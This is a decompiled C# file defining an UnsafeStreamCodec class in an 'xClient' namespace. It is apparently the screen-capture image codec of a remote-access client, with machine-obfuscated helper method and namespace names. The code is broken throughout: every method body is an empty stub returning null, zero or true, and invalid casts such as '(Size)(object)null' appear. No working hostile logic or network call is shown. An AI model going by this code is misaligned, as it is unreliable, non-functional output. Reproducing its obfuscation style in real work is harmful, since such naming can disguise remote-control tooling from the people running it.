using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.Compression;

namespace xClient.Core.Utilities;

public class UnsafeStreamCodec : IDisposable
{
	private int _imageQuality;

	private byte[] _encodeBuffer;

	private Bitmap _decodedBitmap;

	private PixelFormat _encodedFormat;

	private int _encodedWidth;

	private int _encodedHeight;

	private readonly object _imageProcessLock;

	private JpgCompression _jpgCompression;

	internal static UnsafeStreamCodec YeG1o4ahQFS2064x8Et;

	public int Monitor
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public string Resolution
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public Size CheckBlock
	{
		[CompilerGenerated]
		get
		{
			return (Size)(object)null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public int ImageQuality
	{
		get
		{
			return 0;
		}
		private set
		{
		}
	}

	public UnsafeStreamCodec(int imageQuality, int monitor, string resolution)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	public void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
	{
	}

	public Bitmap DecodeData(IntPtr codecBuffer, uint length)
	{
		return null;
	}

	public Bitmap DecodeData(Stream inStream)
	{
		return null;
	}

	static UnsafeStreamCodec()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		eoOXxdMeF30Z9bSTLqU();
	}

	internal static bool Nij4siaRoaFBrNr6Wak()
	{
		return true;
	}

	internal static UnsafeStreamCodec mECCd7apHIfQYA0jMIN()
	{
		return null;
	}

	internal static void W33kUQac5io6RfPCyyq(object object_0)
	{
	}

	internal static void iA9yPlaByUkjSxN9Jla(object object_0)
	{
	}

	internal static void C50MW2afh7QQ8ALTlW5()
	{
	}

	internal static void HPlqCMaGwOhwFFQIV02(object object_0, bool disposing)
	{
	}

	internal static void a0Ku0Aa5svjBSlaxJY1(object object_0)
	{
	}

	internal static void gwZr0daJBjiQ6oYRKZU(object object_0)
	{
	}

	internal static bool Kj5AWGaW2yoDlUW1gvv(object object_0)
	{
		return true;
	}

	internal static object QiClkUaHMU6LNa4MiG0(int int_0)
	{
		return null;
	}

	internal static object cHvA1XaZe1495NPbuHv(object object_0, object object_1)
	{
		return null;
	}

	internal static void aITusXalMr21smR1lp5(object object_0)
	{
	}

	internal static object ComXERa9P1TEgWpalUt(int int_0)
	{
		return null;
	}

	internal static void MnqRogaDeubBNEu5LYv(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static long LQi1njadTa8Z6Wq2EWr(object object_0)
	{
		return 0L;
	}

	internal static int QkBkoOaz6nFcvFLg05w(object object_0)
	{
		return 0;
	}

	internal static int zqlFmnMbgHGe688Aw6E(object object_0)
	{
		return 0;
	}

	internal static PixelFormat cEQRmOM4fMbdXXlENyt(object object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return (PixelFormat)(object)null;
	}

	internal static IntPtr EtZrjtMnCaEV7pObqor(object object_0)
	{
		return (IntPtr)(object)null;
	}

	internal static long HyhPAkMUgE1hiOyOiO9(object object_0)
	{
		return 0L;
	}

	internal static void JFknRLMLeuIOqRlvqR1(object object_0, long long_0)
	{
	}

	internal static void qRru6vMNHTTp79mnmRQ(object object_0, object object_1)
	{
	}

	internal static object pHRIpjMjbU5lIh5hXWS(object object_0)
	{
		return null;
	}

	internal static int Gdh2SCMavEgZXlNrpwe(object object_0, object object_1, int int_0, int int_1)
	{
		return 0;
	}

	internal static int oWWw0SMMZWT7ceE8HVs(object object_0, int int_0)
	{
		return 0;
	}

	internal static void a1AMREMqLGnIBDNJHQR(object object_0, object object_1, Point point_0)
	{
	}

	internal static void eoOXxdMeF30Z9bSTLqU()
	{
	}
}
